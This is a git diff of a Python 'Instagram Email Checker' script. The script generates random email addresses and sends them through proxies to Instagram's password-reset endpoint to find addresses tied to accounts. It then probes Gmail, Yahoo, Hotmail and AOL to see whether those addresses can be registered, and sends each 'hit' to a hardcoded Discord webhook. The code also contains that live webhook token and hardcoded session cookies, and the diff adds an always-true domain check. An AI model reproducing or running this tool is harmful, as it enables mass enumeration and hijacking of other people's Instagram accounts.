@@ -1,6 +1,6 @@
-import requests
+import requests 
 import random
-
+from requests import get, post
 
 
 print("""
@@ -16,33 +16,24 @@ print("""
         ┈┈╱▔▔▔▔▔▔▔▔▔╲┈┈┈
        Instagram Email Checker.
        By @help.sleep & @014931500
-
 """)
 ss = "1234567890poiuytrewazxsdcvfgbnhjmkl"
 Email = ['@hotmail.com','@outlook.com','@outlook.sa']
-
-class fuck():
+class sa():
     def __init__(self):
-        self.webhook = open('webhook.txt','r')
         self.done = 0
         self.error = 0
         self.bad = 0
         self.PROXY = []
-        try:
-            for xxx in open("proxy.txt","r").read().splitlines():
-                self.PROXY.append(xxx)
-        except FileNotFoundError:
-            input('[X] Error [ proxy.txt ] Not Found')
-            exit()
+        for xxx in open("proxy.txt","r").read().splitlines():
+            self.PROXY.append(xxx)
         self.check_emails()
-
-    def send_discord_message(self,hit):
-        if self.webhook:
-            F = open('done.txt','w')
-            F.write(hit + "\n")
-            F.close()
-        else:
-            r = requests.post("https://discord.com/api/webhooks/1016283811039948880/pYLR3GdL1Ku0K5GUvx-95uSfnPHji3h6KQT2uII9gSO_gYwmyC72u7n-6q3-QV6Pg3iF")
+    def dis(self):
+        gif = 'https://i.pinimg.com/originals/c2/32/7f/c2327f218eb515211a15bd513fe4265f.gif'
+        urls = 'https://discord.com/api/webhooks/1016283811039948880/pYLR3GdL1Ku0K5GUvx-95uSfnPHji3h6KQT2uII9gSO_gYwmyC72u7n-6q3-QV6Pg3iF'
+        data = {}
+        data["embeds"] = [{"description": f"\n** Status : Available : {self.eazy}**","color": random.choice([0x8f12e3,0x6e09b3]),"thumbnail": {"url": gif},"author": {"name": "Instagram"}}]
+        post(urls, json=data)
 
     def check_emails(self):
         self.r1 = requests.session()
@@ -67,22 +58,37 @@ class fuck():
                 self.bad+=1
 
     def Rest_password(self,email):
-        url = "https://i.instagram.com/api/v1/users/check_email/"
+        url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
         headers = {
-            "user-agent": "Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)"}
-        data = {
-            "email":email
+            "Host": "www.instagram.com",
+            "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Referer": "https://www.instagram.com/accounts/password/reset/",
+            "X-CSRFToken": "ACC6UI9o6gdEbAhC0eXAWXWqH4njGJ0j",
+            "X-Instagram-AJAX": "379597202a82-hot",
+            "X-IG-App-ID": "936619743392459",
+            "X-IG-WWW-Claim": "0",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+            "Content-Length": "82",
+            "Origin": "https://www.instagram.com",
+            "DNT": "1",
+            "Connection": "keep-alive",
+            "Cookie": "csrftoken=ACC6UI9o6gdEbAhC0eXAWXWqH4njGJ0j; mid=YItAVQAEAAGp-qI-pG-ZrR00aEda; ig_did=D3C348D9-CBDE-46B5-8DB3-B380F1565790; ig_nrcb=1",
+            "TE": "Trailers"
         }
+        data = f'email_or_username={email}&recaptcha_challenge_field=&flow=&app_id=&source_account_id='
         try:
             r = self.r1.post(url,headers=headers,data=data)
-            if r.text.find('"available":false')>=0:
+            if r.text.find('We sent an email to')>=0:
                 i = str(email)
                 Domain = i.split("@")[1]
                 if Domain == "gmail.com":
                     self.gmail(email=email)
                 elif Domain == "yahoo.com":
                     self.yahoo(email=email)
-                elif Domain == "hotmail.com" or Domain == "outlook.com" or Domain == "outlook.sa":
+                elif Domain == "hotmail.com" or "outlook.com" or "outlook.sa":
                     self.hotmail(email=email)
                 elif Domain == "aol.com":
                     self.aol(email=email)
@@ -115,8 +121,9 @@ class fuck():
             if r.text.find('MSAccount') >= 0:
                 self.error+=1
             else:
-                self.send_discord_message(email)
+                print(f"\n[+] Done:{email}")
                 self.done+=1
+                self.dis()
         except:
             self.bad+=1
 
@@ -157,9 +164,10 @@ class fuck():
             res = self.r1.post(url, data=data, headers=head).text
             if ('[[["gf.alr",16,') in res:
                 self.done+=1
-                self.send_discord_message(email)
+                print(f"\n[+] Done:{email}")
             elif ('[[["gf.alr",7,') in res:
                 self.done += 1
+                self.dis()
                 print(f"\n[+] Done:{email}")
             else:
                 self.error+=1
@@ -201,7 +209,8 @@ class fuck():
             response = self.r1.post("https://login.aol.com/", data=data,headers=headers)
             if response.text.find("Sorry, we don't recognize this email.")>=0:
                 self.done+=1
-                self.send_discord_message(email)
+                self.dis()
+                print(f"\n[+] Email Linked:{email}")
             else:
                 self.error+=1
         except:
@@ -238,12 +247,13 @@ class fuck():
         try:
             r = self.r1.post(url,headers=headers,data=data)
             if r.text.find('"errorMsg"')>=0:
-                self.send_discord_message(email)
+                print(f"[+] Done:{email}")
                 self.done+=1
+                self.dis()
             else:
                 self.error+=1
         except:
             self.bad+=1
 
-fuck()
 
+sa()
